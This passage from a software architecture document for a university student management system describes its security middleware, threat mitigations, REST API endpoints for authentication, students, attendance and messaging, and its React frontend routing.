   - The account status is active (`isActive === true`).
   - The user's role has not been demoted or revoked since token generation.
5. **Context Attachment**: Attaches the Sequelize user instance to `req.user` and passes control via `next()`.

### 3.4.2 Role-Based Authorization Middleware (`middleware/roleMiddleware.js`)
Role-based authorization is enforced through higher-order middleware factory functions:
- `verifyRole(...allowedRoles)`: Accepts an array of permissible roles (e.g., `verifyRole('admin', 'coordinator')`).
- Evaluates whether `req.user.role` matches any element of `allowedRoles`.
- If unmatched, terminates the request with HTTP `403 Forbidden`:
  ```json
  {
    "success": false,
    "message": "Access denied: Required role not possessed",
    "requiredRoles": ["admin", "coordinator"],
    "currentRole": "faculty"
  }
  ```
- Provides specialized scope validators such as `verifyClassOwnership`, which inspects `req.params.classId` or `req.body.section` to confirm that a coordinator or faculty member is authorized to access the specific class payload.

### 3.4.3 Rate Limiting Engine (`middleware/rateLimiter.js`)
To safeguard the API against brute-force attacks and denial-of-service (DoS) attempts, GBU-SDSM employs `express-rate-limit`:
- **General API Limiter**:
  - `windowMs`: 15 minutes (`15 * 60 * 1000` ms).
  - `max`: 500 requests per IP address per window.
  - `standardHeaders`: true (returns `RateLimit-Limit`, `RateLimit-Remaining`, and `RateLimit-Reset` headers).
- **Strict Authentication Limiter** (applied to `/api/auth/login` and `/api/auth/reset-password`):
  - `windowMs`: 15 minutes.
  - `max`: 10 requests per IP address.
  - Returns HTTP `429 Too Many Requests` with retry delay metadata.

### 3.4.4 HTTP Security Headers (`middleware/securityHeaders.js`)
Implemented using `helmet`, configuring defensive HTTP response headers:
- `Content-Security-Policy (CSP)`: Restricts script and style execution origins.
- `X-Frame-Options: DENY`: Prevents clickjacking by prohibiting rendering inside `<iframe>` or `<frame>`.
- `X-Content-Type-Options: nosniff`: Disables MIME-type sniffing.
- `Strict-Transport-Security (HSTS)`: Enforces HTTPS for 1 year (`max-age=31536000; includeSubDomains`).
- `Referrer-Policy: strict-origin-when-cross-origin`: Safeguards sensitive route tokens from leaking in referrer headers.

### 3.4.5 Request Audit Logger (`middleware/requestLogger.js`)
Every inbound request is assigned a UUIDv4 Correlation ID (`X-Correlation-ID`). The logger records:
- Timestamp (ISO 8601 UTC).
- HTTP Method & Full URL path.
- Request IP address (resolving `X-Forwarded-For` when behind reverse proxies).
- Authenticated User ID & Role (if available).
- Execution Latency (high-resolution timer `process.hrtime()`).
- Sanitized request body (automatically masking fields like `password`, `token`, `otp`, `cardNumber`).

### 3.4.6 Multipart File Ingestion Pipeline (`middleware/multerUpload.js`)
Handles binary uploads for student profile pictures and bulk Excel spreadsheets:
- **Storage Engine**: Memory storage for Excel parsing (allowing direct in-memory buffer streaming into `xlsx` without temporary disk I/O overhead) and disk storage for persistent media uploads.
- **Disk Storage Directory**: Configured to `uploads/students/` and `uploads/documents/`.
- **Filename Sanitization**: Replaces non-alphanumeric characters with hyphens and prepends high-resolution timestamps to guarantee uniqueness (`Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname)`).
- **File Filter & MIME Whitelist**:
  - Documents: `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet` (`.xlsx`), `application/vnd.ms-excel` (`.xls`), `text/csv` (`.csv`), `application/pdf` (`.pdf`).
  - Images: `image/jpeg`, `image/png`, `image/webp`.
- **Payload Limits**: Max file size capped at 10 MB for spreadsheets and 5 MB for profile photographs.

---

## 3.5 Cross-Origin Resource Sharing (CORS) & Network Configuration

GBU-SDSM supports segmented multi-origin deployments where the React Single Page Application (SPA) runs on a separate port or domain from the Express API server.

```javascript
const corsOptions = {
  origin: function (origin, callback) {
    const allowedOrigins = [
      'http://localhost:5173',
      'http://localhost:3000',
      'http://127.0.0.1:5173',
      process.env.CLIENT_URL,
      process.env.FRONTEND_APP_URL
    ].filter(Boolean);

    // Allow requests with no origin (like mobile apps, curl, or Postman)
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Cross-Origin Request Blocked by CORS Security Policy'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'X-Correlation-ID', 'Accept'],
  exposedHeaders: ['Content-Disposition', 'RateLimit-Limit', 'RateLimit-Remaining'],
  maxAge: 86400 // 24-hour pre-flight cache
};
```

---

## 3.6 Attack Vector Mitigations & Threat Modeling

| Threat Vector | Severity | Vulnerability Mechanism | GBU-SDSM Architectural Mitigation |
| :--- | :---: | :--- | :--- |
| **SQL Injection (SQLi)** | Critical | Malicious SQL fragments injected via query parameters or form fields. | Sequelize ORM parameterized queries with strict typed attribute binding. All raw SQL queries (where utilized) mandate explicit replacement objects (`:param`). |
| **Cross-Site Scripting (XSS)** | High | Injection of malicious client-side JavaScript into profile fields or chat messages. | React's virtual DOM auto-escapes all rendered text strings. Backend input sanitization removes raw HTML tags from user strings. CSP headers block untrusted script sources. |
| **Cross-Site Request Forgery (CSRF)** | High | Unauthorized state-changing commands executed from a trusted user session. | API commands require access tokens passed via explicit `Authorization: Bearer` headers, which third-party sites cannot forge. Refresh cookies utilize `SameSite=Strict`. |
| **Insecure Direct Object Reference (IDOR)** | High | Manipulating database primary keys in URL params (e.g. `GET /students/105`) to access unauthorized records. | Scoped authorization checks: Coordinators are restricted to students belonging to their assigned `program` + `branch` + `section`. Faculty can only view students in their assigned course rosters. Students can only access their own user ID record. |
| **Brute-Force & Credential Stuffing** | High | Automated high-frequency dictionary attacks against user login endpoints. | Dual-layer defense: Express rate limiting throttles requests per IP; User model tracks consecutive failed login attempts, locking accounts after 5 failures for 30 minutes. |
| **Mass Assignment Vulnerability** | Medium | Over-posting unvalidated JSON fields to overwrite protected columns (e.g. `role: "admin"`). | Controller endpoints explicitly destructure and whitelist permissible fields before passing to Sequelize `create` or `update` calls. |
| **Timing Attacks** | Medium | Measuring execution time differences to deduce valid usernames or password hash bytes. | Constant-time password hashing comparisons via `bcrypt.compare` and normalized error messages preventing account enumeration. |
| **Denial of Service (Memory Exhaustion)** | Medium | Ingestion of multi-gigabyte files or unbounded database queries. | Strict Multer file size limits (10MB) combined with mandatory database pagination (`limit` and `offset` defaults). |



---

# SECTION 4: Comprehensive RESTful API Specification (All 11 Route Handlers)

## 4.1 Global API Conventions & Protocol Standards

GBU-SDSM exposes an enterprise RESTful JSON API adhering to strict architectural invariants:
- **Base URI Path**: `/api/v1` (with legacy alias `/api` supported for backward compatibility).
- **Protocol**: HTTPS in staging/production, HTTP in local development.
- **Payload Format**: `application/json` for standard transactions; `multipart/form-data` for file and binary document streaming.
- **Character Encoding**: UTF-8.
- **Standard Success Response Envelope**:
  ```json
  {
    "success": true,
    "statusCode": 200,
    "message": "Operation completed successfully",
    "data": { ... },
    "meta": {
      "timestamp": "2026-09-05T06:15:30.123Z",
      "correlationId": "f47ac10b-58cc-4372-a567-0e02b2c3d479"
    }
  }
  ```
- **Standard Paginated Response Envelope**:
  ```json
  {
    "success": true,
    "statusCode": 200,
    "data": [ ... ],
    "pagination": {
      "currentPage": 1,
      "pageSize": 25,
      "totalRecords": 348,
      "totalPages": 14,
      "hasNextPage": true,
      "hasPrevPage": false
    }
  }
  ```
- **Standard Error Response Envelope**:
  ```json
  {
    "success": false,
    "statusCode": 400,
    "message": "Validation failed on input parameters",
    "errors": [
      { "field": "enrollmentNo", "message": "Enrollment number must follow GBU format (e.g. 2500100481)" }
    ],
    "meta": {
      "timestamp": "2026-09-05T06:15:30.123Z",
      "correlationId": "f47ac10b-58cc-4372-a567-0e02b2c3d479"
    }
  }
  ```

---

## 4.2 Authentication & Identity Endpoints (`/api/auth`)

### 4.2.1 `POST /api/auth/login`
- **Description**: Authenticates a user using email, username, or enrollment number, returning an access token and issuing a refresh cookie.
- **Authorization**: Public / Unauthenticated. Rate limited to 10 requests per 15 minutes.
- **Request Body**:
  ```json
  {
    "identifier": "faculty.cs@gbu.ac.in",
    "password": "SecurePassword123!",
    "role": "faculty"
  }
  ```
- **Internal Execution Flow**:
  1. Sanitizes inputs; asserts `identifier` and `password` are non-empty strings.
  2. Queries `User` model matching `email`, `username`, or `enrollmentNo` using `Sequelize.Op.or`.
  3. Verifies `user.isActive === true` and `user.isApproved === true`.
  4. Calls `bcrypt.compare(password, user.password)`. If false, increments `failedLoginAttempts`.
  5. If valid, updates `lastLoginAt = new Date()`, resets `failedLoginAttempts = 0`.
  6. Generates 15-minute JWT Access Token signed with `JWT_SECRET`.
  7. Generates 7-day JWT Refresh Token signed with `REFRESH_TOKEN_SECRET`.
  8. Sets HTTP-Only Cookie `refreshToken`.
- **Success Response (200 OK)**:
  ```json
  {
    "success": true,
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
      "id": 42,
      "email": "faculty.cs@gbu.ac.in",
      "role": "faculty",
      "name": "Dr. Ramesh Sharma",
      "program": "B.Tech",
      "branch": "Computer Science and Engineering",
      "section": "A"
    }
  }
  ```

### 4.2.2 `POST /api/auth/logout`
- **Description**: Terminates session, clears HTTP-only cookie, and increments token version.
- **Authorization**: Bearer Access Token required.
- **Response (200 OK)**:
  ```json
  { "success": true, "message": "Logged out successfully" }
  ```

### 4.2.3 `GET /api/auth/me`
- **Description**: Retrieves current authenticated identity, profile parameters, and associated role records.
- **Authorization**: Bearer Access Token.
- **Response (200 OK)**:
  ```json
  {
    "success": true,
    "user": {
      "id": 42,
      "name": "Dr. Ramesh Sharma",
      "email": "faculty.cs@gbu.ac.in",
      "role": "faculty",
      "department": "Computer Science",
      "designation": "Associate Professor"
    }
  }
  ```

### 4.2.4 `POST /api/auth/refresh-token`
- **Description**: Exchanges a valid `refreshToken` cookie for a fresh access token.
- **Authorization**: Public endpoint; requires valid `refreshToken` cookie.
- **Response (200 OK)**:
  ```json
  {
    "success": true,
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  }
  ```

### 4.2.5 `POST /api/auth/forgot-password`
- **Request Body**: `{ "email": "student@gbu.ac.in" }`
- **Behavior**: Generates 6-digit cryptographic OTP, writes to `users.resetPasswordOtp` with 10-minute expiry, dispatches email notification.
- **Response (200 OK)**: `{ "success": true, "message": "OTP sent to registered email" }`

### 4.2.6 `POST /api/auth/verify-reset-otp`
- **Request Body**: `{ "email": "student@gbu.ac.in", "otp": "489201" }`
- **Response (200 OK)**: `{ "success": true, "message": "OTP verified successfully" }`

### 4.2.7 `POST /api/auth/reset-password`
- **Request Body**: `{ "email": "student@gbu.ac.in", "otp": "489201", "newPassword": "NewSecurePassword456!" }`
- **Behavior**: Validates OTP and TTL; hashes `newPassword` with bcrypt (10 rounds); clears OTP fields.
- **Response (200 OK)**: `{ "success": true, "message": "Password reset successfully. Please login with new credentials." }`

---

## 4.3 Student Administration Endpoints (`/api/admin/students`)

### 4.3.1 `GET /api/admin/students`
- **Description**: Retrieves a paginated, filterable collection of student records.
- **Authorization**: Role: `admin`.
- **Query Parameters**:
  - `page` (default `1`): Positive integer page index.
  - `limit` (default `25`): Records per page (max `200`).
  - `program`: e.g. `"B.Tech"`.
  - `branch`: e.g. `"Computer Science and Engineering"`.
  - `year`: e.g. `3` or `semester`: `5`.
  - `section`: e.g. `"A"`.
  - `search`: Substring match across `name`, `enrollmentNo`, `rollNumber`, `email`.
  - `sort`: Attribute to sort by (`enrollmentNo`, `name`, `createdAt`).
  - `order`: `ASC` or `DESC`.
- **Internal Execution Flow**:
  1. Parses query parameters and constructs a Sequelize `whereClause`.
  2. Substring search combines fields via `[Op.or]: [{ name: { [Op.like]: `%${search}%` } }, ...]`.
  3. Executes `Student.findAndCountAll({ where: whereClause, limit, offset, order, include: [User] })`.
  4. Calculates `totalPages = Math.ceil(count / limit)`.
- **Success Response (200 OK)**:
  ```json
  {
    "success": true,
    "students": [
      {
        "id": 101,
        "enrollmentNo": "2500100481",
        "name": "Aarav Sharma",
        "program": "B.Tech",
        "branch": "Computer Science and Engineering",
        "year": 3,
        "section": "A",
        "cgpa": 8.75,
        "placed": true,
        "company": "Tata Consultancy Services",
        "package": "7.5 LPA"
      }
    ],
    "pagination": { "currentPage": 1, "pageSize": 25, "totalRecords": 1, "totalPages": 1 }
  }
  ```

### 4.3.2 `GET /api/admin/students/:id`
- **Description**: Retrieves complete record for a single student, including academic history, placement parameters, and category breakdown.
- **Authorization**: Role: `admin`.
- **URL Parameter**: `id` (Integer primary key).
- **Response (200 OK)**: Full student JSON object matching the complete Student schema.

### 4.3.3 `POST /api/admin/students`
- **Description**: Creates a new student profile and generates an associated `User` record.
- **Authorization**: Role: `admin`.
- **Request Body Schema**:
  ```json
  {
    "name": "Neha Verma",
    "enrollmentNo": "2500100482",
    "email": "neha.v@gbu.ac.in",
    "program": "B.Tech",
    "branch": "Information Technology",
    "year": 2,
    "section": "B",
    "gender": "Female",
    "category": "GEN",
    "dob": "2004-05-18",
    "mobileNumber": "9876543210"
  }
  ```
- **Transactional Logic**:
  1. Begins managed transaction (`sequelize.transaction`).
  2. Verifies that `enrollmentNo` and `email` do not collide with existing records.
  3. Creates `User` entry with default password (e.g. `Student@GBU2026`) hashed with bcrypt.
  4. Creates `Student` entry with foreign key `userId: user.id`.
  5. Commits transaction; returns created student object.

### 4.3.4 `PUT /api/admin/students/:id`
- **Description**: Updates all attributes of an existing student, including demographic, academic, internship, and placement details.
- **Authorization**: Role: `admin`.
- **Request Body**: Key-value pairs matching editable student attributes:
  ```json
  {
    "name": "Neha Verma",
    "cgpa": 8.92,
    "hasInternship": true,
    "internshipCompany": "Microsoft India",
    "internshipDoj": "2026-06-01",
    "internshipDoe": "2026-08-01",
    "internshipIsPaid": true,
    "internshipStipend": "50000/month",
    "placed": true,
    "company": "Microsoft",
    "package": "24 LPA",
    "placementDoj": "2027-07-01",
    "placementIsPaid": true
  }
  ```

### 4.3.5 `DELETE /api/admin/students/:id`
- **Description**: Deletes student record and cascades to attendance entries and associated user account.
- **Authorization**: Role: `admin`.
- **Response (200 OK)**: `{ "success": true, "message": "Student record deleted successfully" }`

### 4.3.6 `POST /api/admin/students/bulk-upload`
- **Description**: Ingests an Excel spreadsheet (`.xlsx` / `.xls`) or CSV file, parses rows in memory, performs fuzzy header matching, validates field constraints, and batch-inserts student and user records.
- **Authorization**: Role: `admin`. Content-Type: `multipart/form-data`.
- **Form Field**: `file` (Binary Excel buffer).
- **Processing Details**: See Section 8.2 for complete heuristic matching algorithm and error reporting.

### 4.3.7 `POST /api/admin/students/bulk-edit`
- **Description**: Performs batch updates across an array of selected student IDs. Used for advancing academic semesters, reassigning sections, or batch-updating placement/fee statuses.
- **Authorization**: Role: `admin`.
- **Request Body Schema**:
  ```json
  {
    "studentIds": [101, 102, 103, 104],
    "updates": {
      "year": 4,
      "section": "A",
      "status": "Active"
    }
  }
  ```
- **Internal Execution Flow**:
  1. Validates that `studentIds` is a non-empty array of valid integers.
  2. Whitelists fields within `updates` to prevent unauthorized attribute overwriting.
  3. Executes atomic update: `Student.update(updates, { where: { id: { [Op.in]: studentIds } } })`.
  4. Returns count of modified records: `{ "success": true, "updatedCount": 4 }`.

---

## 4.4 Coordinator Endpoints (`/api/coordinator`)

### 4.4.1 `GET /api/coordinator/dashboard`
- **Description**: Returns analytical summary for the coordinator's assigned program, branch, and section.
- **Authorization**: Role: `coordinator`.
- **Execution Logic**:
  1. Resolves coordinator record from `req.user.id`.
  2. Queries total students enrolled in coordinator's class (`program`, `branch`, `section`).
  3. Computes average class attendance percentage across all attendance sessions.
  4. Retrieves recent 5 attendance sessions and unread broadcast messages.
- **Success Response (200 OK)**:
  ```json
  {
    "success": true,
    "data": {
      "assignedClass": {
        "program": "B.Tech",
        "branch": "Computer Science and Engineering",
        "section": "A",
        "semester": 6
      },
      "totalStudents": 64,
      "averageAttendance": 81.4,
      "defaultersCount": 7,
      "recentSessions": [ ... ]
    }
  }
  ```

### 4.4.2 `GET /api/coordinator/students`
- **Description**: Retrieves list of students belonging *strictly* to the coordinator's assigned class.
- **Authorization**: Role: `coordinator`.
- **Security Constraint**: Controller enforces `where: { program: coord.program, branch: coord.branch, section: coord.section }`. Coordinator cannot access student data outside this boundary.

### 4.4.3 `PUT /api/coordinator/students/:id`
- **Description**: Updates an individual student profile within the coordinator's assigned class.
- **Authorization**: Role: `coordinator`.
- **Constraint**: Checks ownership prior to executing update. If `student.section !== coord.section`, immediately rejects with HTTP `403 Forbidden`.

### 4.4.4 `POST /api/coordinator/students/bulk-edit`
- **Description**: Bulk updates demographic or academic attributes for multiple students in the coordinator's class.
- **Authorization**: Role: `coordinator`.
- **Safety Enforcement**: Enforces `where: { id: { [Op.in]: studentIds }, section: coord.section, branch: coord.branch }` ensuring that cross-class student IDs passed by tampering are silently excluded from modification.

---

## 4.5 Chairperson Endpoints (`/api/chairperson`)

### 4.5.1 `GET /api/chairperson/dashboard`
- **Description**: Provides multi-class departmental overview for executive monitoring.
- **Authorization**: Role: `chairperson`.
- **Execution Logic**:
  1. Queries all programs and classes associated with the chairperson via `ChairpersonClass` join table.
  2. Aggregates student counts, gender ratios, category distributions, and overall department attendance.
  3. Returns active faculty count and list of unassigned courses.

### 4.5.2 `GET /api/chairperson/classes`
- **Description**: Returns all classes and sections overseen by the chairperson.
- **Response**: Array of class objects with program, branch, semester, section, and student counts.

### 4.5.3 `GET /api/chairperson/students`
- **Description**: Retrieves students across all classes assigned to the chairperson, supporting multi-class filtering and departmental analytics.

### 4.5.4 `POST /api/chairperson/faculty/assign`
- **Description**: Assigns a faculty member to teach a subject in a specific class and section.
- **Authorization**: Role: `chairperson` or `admin`.
- **Request Body**:
  ```json
  {
    "facultyId": 14,
    "subject": "Distributed Systems",
    "subjectCode": "CS402",
    "program": "B.Tech",
    "branch": "Computer Science and Engineering",
    "semester": 6,
    "section": "A",
    "academicYear": "2025-2026"
  }
  ```
- **Execution Flow**: Inserts record into `faculty_assignments` table.

---

## 4.6 Faculty Endpoints (`/api/faculty`)

### 4.6.1 `GET /api/faculty/dashboard`
- **Description**: Returns faculty operational dashboard metrics: assigned teaching courses, number of active classes, upcoming timetable sessions, and recent attendance entries.
- **Authorization**: Role: `faculty`.

### 4.6.2 `GET /api/faculty/classes`
- **Description**: Lists all courses, sections, and classes assigned to the logged-in faculty member.
- **Authorization**: Role: `faculty`.
- **Execution Logic**:
  1. Identifies faculty record from `req.user.id` or email.
  2. Queries `FacultyAssignment.findAll({ where: { facultyId: faculty.id } })`.
  3. Groups by `program`, `branch`, `section`, and `subjectCode`.
  4. Annotates each class with enrolled student count.

### 4.6.3 `GET /api/faculty/classes/:classId/roster`
- **Description**: Returns full list of enrolled students for a specific assigned class, ordered by enrollment number. Used directly to populate the attendance marking interface.
- **Authorization**: Role: `faculty`.
- **Response**:
  ```json
  {
    "success": true,
    "classDetails": { "subject": "Machine Learning", "section": "A" },
    "roster": [
      { "studentId": 101, "enrollmentNo": "2500100481", "name": "Aarav Sharma", "rollNumber": "01" }
    ]
  }
  ```

---

## 4.7 Attendance System Endpoints (`/api/attendance`)

### 4.7.1 `POST /api/attendance/sessions`
- **Description**: Initializes an attendance session for a class and marks the attendance status for every student in a single atomic database transaction.
- **Authorization**: Role: `faculty`, `coordinator`, or `admin`.
- **Request Body Schema**:
  ```json
  {
    "program": "B.Tech",
    "branch": "Computer Science and Engineering",
    "semester": 6,
    "section": "A",
    "subject": "Cloud Computing",
    "subjectCode": "CS406",
    "sessionDate": "2026-09-05",
    "sessionType": "Lecture",
    "topicCovered": "Containerization with Docker & Kubernetes",
    "records": [
      { "studentId": 101, "status": "Present", "remarks": "" },
      { "studentId": 102, "status": "Absent", "remarks": "Medical leave requested" }
    ]
  }
  ```
- **Internal Execution Flow**:
  1. Initiates database transaction (`t = await sequelize.transaction()`).
  2. Verifies that duplicate session does not exist for same subject, class, section, date, and slot.
  3. Creates `AttendanceSession` row.
  4. Formats attendance records with foreign key `sessionId: session.id`.
  5. Bulk inserts records via `AttendanceRecord.bulkCreate(records, { transaction: t })`.
  6. Commits transaction `await t.commit()`.

### 4.7.2 `PUT /api/attendance/sessions/:sessionId`
- **Description**: Modifies attendance records for an existing session.
- **Authorization**: Session creator (within 24 hours), Coordinator (assigned section), or Admin.
- **Constraint**: If `session.isLocked === true`, modifications are rejected unless caller has `admin` role.

### 4.7.3 `PUT /api/attendance/sessions/:sessionId/lock`
- **Description**: Locks an attendance session against further alterations.
- **Authorization**: Role: `coordinator` or `admin`.

### 4.7.4 `GET /api/attendance/student/:studentId`
- **Description**: Returns calculated attendance metrics for an individual student: overall attendance percentage, subject-by-subject percentage, total sessions conducted, sessions attended, and sessions missed.
- **Authorization**: Student (own profile), Faculty/Coordinator (assigned class), Admin.
- **Mathematical Formula**:
  $$\text{Attendance Percentage} = \left( \frac{\sum \text{Present Sessions} + (0.5 \times \sum \text{Late Sessions})}{\sum \text{Total Eligible Sessions}} \right) \times 100$$

---

## 4.8 Messaging & Communication Endpoints (`/api/messages`)

### 4.8.1 `GET /api/messages/inbox`
- **Description**: Fetches paginated inbox messages received by the authenticated user, ordered by timestamp descending.
- **Query Params**: `page`, `limit`, `unreadOnly` (boolean).

### 4.8.2 `POST /api/messages/send`
- **Description**: Sends a message to an individual user, a specific class, or a role group.
- **Authorization**: Authenticated users.
- **Request Body Schema**:
  ```json
  {
    "recipientType": "Class",
    "targetProgram": "B.Tech",
    "targetBranch": "Computer Science and Engineering",
    "targetSection": "A",
    "subject": "Midterm Examination Schedule Announcement",
    "content": "The midterm examination for Distributed Systems will be held on Monday at 10:00 AM.",
    "priority": "High"
  }
  ```
- **Execution Flow**:
  - If `recipientType === 'Individual'`: Writes single record to `messages` table with `recipientId`.
  - If `recipientType === 'Class'`: Broadcasts message to all students enrolled in specified program/branch/section.
  - If `recipientType === 'Universal'`: Accessible only by Admin; broadcasts to entire institution.

### 4.8.3 `PUT /api/messages/:messageId/read`
- **Description**: Marks message as read (`isRead = true`, `readAt = new Date()`).

---

## 4.9 Timetable & Teaching Endpoints (`/api/timetable` & `/api/teaching`)

### 4.9.1 `GET /api/timetable/:program/:branch/:semester/:section`
- **Description**: Returns weekly class timetable (Monday through Saturday, 9:00 AM to 5:00 PM) including course name, code, faculty instructor, and classroom venue.

### 4.9.2 `POST /api/timetable`
- **Description**: Upserts timetable schedule matrix for a specific section.
- **Authorization**: Role: `coordinator`, `chairperson`, `admin`.

### 4.9.3 `GET /api/teaching/assignments`
- **Description**: Retrieves all faculty teaching assignments with associated user and course metadata.

---

## 4.10 Specialization & Academic Classification Endpoints (`/api/specialization`)

### 4.10.1 `GET /api/specialization/programs`
- **Description**: Returns institutional hierarchy of academic programs (e.g. B.Tech, M.Tech, MCA, MBA), active branches, and elective specialization tracks (e.g. AI & ML, Cyber Security, Data Science, Cloud Computing).

### 4.10.2 `POST /api/specialization/assign`
- **Description**: Updates elective specialization track for a student or batch of students.
- **Authorization**: Role: `coordinator`, `admin`.



---

# SECTION 5: Frontend Architecture, State Management & Routing

## 5.1 Technology Stack & Architectural Paradigms

The user interface of GBU-SDSM is engineered as a modern Single Page Application (SPA) leveraging **React 18** and **TypeScript**, bundled with **Vite 5**. The frontend architecture is structured around modularity, strict type safety, unidirectional data flow, and responsive presentation.

```mermaid
flowchart TD
    subgraph ViewLayer["Presentation Layer (React 18 & Tailwind CSS)"]
        Landing["Landing & Public Pages"]
        AdminUI["Admin Portal"]
        CoordUI["Coordinator Portal"]
        ChairUI["Chairperson Portal"]
        FacUI["Faculty Portal"]
        StudentUI["Student / Client Portal"]
    end

    subgraph StateLayer["State Management & Navigation"]
        Router["React Router DOM (BrowserRouter)"]
        ReduxStore["Redux Toolkit Store"]
        AdminSlice["adminSlice (Students, Stats, Filters)"]
        UserSlice["userSlice (Auth, Identity, Roles)"]
        LocalState["Component Hooks (useState, useMemo, useCallback)"]
    end

    subgraph NetworkLayer["Data Synchronization Layer"]
        AxiosClient["Axios HTTP Client (Singleton)"]
        ReqInterceptor["Request Interceptor (Bearer Token Injection)"]
        RespInterceptor["Response Interceptor (401 Refresh & Errors)"]
    end

    ViewLayer --> Router
    Router --> StateLayer
    StateLayer --> NetworkLayer
    NetworkLayer --> BackEnd["Express REST API (/api/*)"]
```

### 5.1.1 Core Frontend Dependencies
- **React 18.2+**: Utilizes concurrent rendering capabilities, functional components, hooks pattern, and React Suspense for lazy code-splitting.
- **TypeScript 5.x**: Enforces compile-time type validation across components, props, state slices, and API payload structures.
- **Vite 5**: Delivers fast Hot Module Replacement (HMR) in development and Rollup-based chunk optimization for production distributions.
- **Tailwind CSS 3.x**: Utility-first CSS framework providing a custom GBU design system (custom primary blues, emerald accents, dark/light surface tokens, and responsive breakpoints: `sm: 640px`, `md: 768px`, `lg: 1024px`, `xl: 1280px`, `2xl: 1536px`).
- **Lucide React**: Modern, tree-shakeable icon suite ensuring visual consistency across portals.
- **XLSX (SheetJS)**: Client-side spreadsheet parsing and generation for instant data export without server latency.

---

## 5.2 Application Root & Router Tree Hierarchy (`src/App.tsx`)

Routing in GBU-SDSM is powered by **React Router DOM v6**, structured into public routes, authentication routes, and role-guarded portal layouts.

### 5.2.1 Route Guarding & Protection Wrappers
- **`ProtectedRoute`**: Verifies that an authentication token exists and that the user session is active. Unauthenticated requests are redirected to `/login` with the original URL preserved in `location.state.from` for post-login redirection.
- **`RoleRoute`**: Takes an array of permissible roles (`allowedRoles: Role[]`). Evaluates the authenticated user's role:
  - If matches: Renders target route layout via `<Outlet />`.
  - If mismatch: Redirects to unauthorized fallback or the user's appropriate default dashboard.

### 5.2.2 Complete Router Navigation Matrix

| Path | Component / Page | Access Control / Roles | Purpose & Features |
| :--- | :--- | :--- | :--- |
| `/` | `LandingPage` | Public | Institutional landing page, news ticker, key metrics, portal links |
| `/about` | `AboutPage` | Public | Information on Gautam Buddha University & SDSM platform history |
| `/contact` | `ContactPage` | Public | Contact directories, departmental emails, campus map |
| `/gallery` | `GalleryPage` | Public | Campus and departmental photographic gallery |
| `/developers` | `DevelopersPage` | Public | Developer credits, engineering specifications, release log |
| `/login` | `LoginPage` | Public (Guest) | Multi-role authentication portal with identifier & password input |
| `/register` | `RegisterPage` | Public (Guest) | Student initial registration and profile onboarding |
| `/forgot-password` | `ForgotPassword` | Public (Guest) | Request 6-digit OTP for password recovery |
| `/reset-password` | `ResetPassword` | Public (Guest) | Submit OTP and establish new account password |
| **Admin Portal** | | | |
| `/admin` | `AdminDashboard` | Role: `admin` | Macro analytics, student distributions, system health, audit logs |
| `/admin/dashboard` | `AdminDashboard` | Role: `admin` | Canonical dashboard route alias |
| `/admin/students` | `StudentList` | Role: `admin` | Full student directory, multi-filter search, pagination, bulk edit |
| `/admin/students/bulk-upload` | `BulkUploadPage` | Role: `admin` | Excel spreadsheet ingestion, column mapping, batch import |
| `/admin/coordinators` | `CoordinatorManagement` | Role: `admin` | Create, edit, and assign classes to academic coordinators |
| `/admin/chairpersons` | `ChairpersonManagement` | Role: `admin` | Create and configure departmental chairpersons |
| `/admin/faculty` | `FacultyManagement` | Role: `admin` | Manage faculty database, designations, departments |
| `/admin/attendance` | `AdminAttendance` | Role: `admin` | Cross-department attendance tracking, session override, lock |
| `/admin/reports` | `ReportsPage` | Role: `admin` | Comprehensive data exports, placement reports, demographic charts |
| `/admin/settings` | `SettingsPage` | Role: `admin` | System configuration, academic terms, database maintenance |
| **Coordinator Portal** | | | |
| `/coordinator` | `CoordinatorDashboard` | Role: `coordinator` | Scoped dashboard for assigned class/section metrics |
| `/coordinator/students` | `CoordinatorStudents` | Role: `coordinator` | Assigned section student list, single & bulk edit, export |
| `/coordinator/attendance` | `CoordinatorAttendance` | Role: `coordinator` | Mark and review class attendance sessions, defaulter alert |
| `/coordinator/messages` | `CoordinatorMessages` | Role: `coordinator` | Send announcements to class students, contact faculty/admin |
| **Chairperson Portal** | | | |
| `/chairperson` | `ChairpersonDashboard` | Role: `chairperson` | Departmental multi-program analytics and performance overview |
| `/chairperson/classes` | `ChairpersonClasses` | Role: `chairperson` | Class and section management across overseen programs |
| `/chairperson/faculty` | `ChairpersonFaculty` | Role: `chairperson` | Faculty teaching assignments, workload distribution |
| `/chairperson/students` | `ChairpersonStudents` | Role: `chairperson` | Department-wide student lookup and performance review |
| `/chairperson/attendance` | `ChairpersonAttendance` | Role: `chairperson` | Departmental attendance audits and reports |
| **Faculty Portal** | | | |
| `/faculty` | `FacultyDashboard` | Role: `faculty` | Assigned courses, daily timetable, upcoming sessions |
| `/faculty/classes` | `FacultyClasses` | Role: `faculty` | List of assigned classes and enrolled rosters |
| `/faculty/attendance` | `FacultyAttendance` | Role: `faculty` | Mark attendance session for specific course/section |
| `/faculty/profile` | `FacultyProfile` | Role: `faculty` | View and update faculty profile information |
| `/faculty/messages` | `FacultyMessages` | Role: `faculty` | Peer and student communication center |
| **Student Portal** | | | |
| `/client` | `ClientDashboard` | Role: `student` | Student personal dashboard, attendance summary, notifications |
| `/client/profile` | `ClientProfile` | Role: `student` | Comprehensive student personal & academic profile |
| `/client/attendance` | `ClientAttendance` | Role: `student` | Subject-wise attendance percentages, detailed session logs |
| `/client/timetable` | `ClientTimetable` | Role: `student` | Weekly class timetable schedule |
| `/client/messages` | `ClientMessages` | Role: `student` | Announcements received from coordinators and faculty |
| **Teaching Portal** | | | |
| `/teaching` | `TeachingDashboard` | Role: `faculty`, `coordinator` | Teaching schedule, syllabus progression tracking |
| `*` | `NotFoundPage` | Public | 404 error page with navigation back to safe roots |

---

## 5.3 Global State Management Architecture (`src/store`)

GBU-SDSM utilizes **Redux Toolkit (RTK)** to manage application-wide shared state. State slices are normalized and typed to eliminate invalid state transitions.

```
src/store/
├── index.ts          # Central store configuration, typed dispatch & selector hooks
├── adminSlice.ts     # Admin domain state: students, statistics, filters, pagination
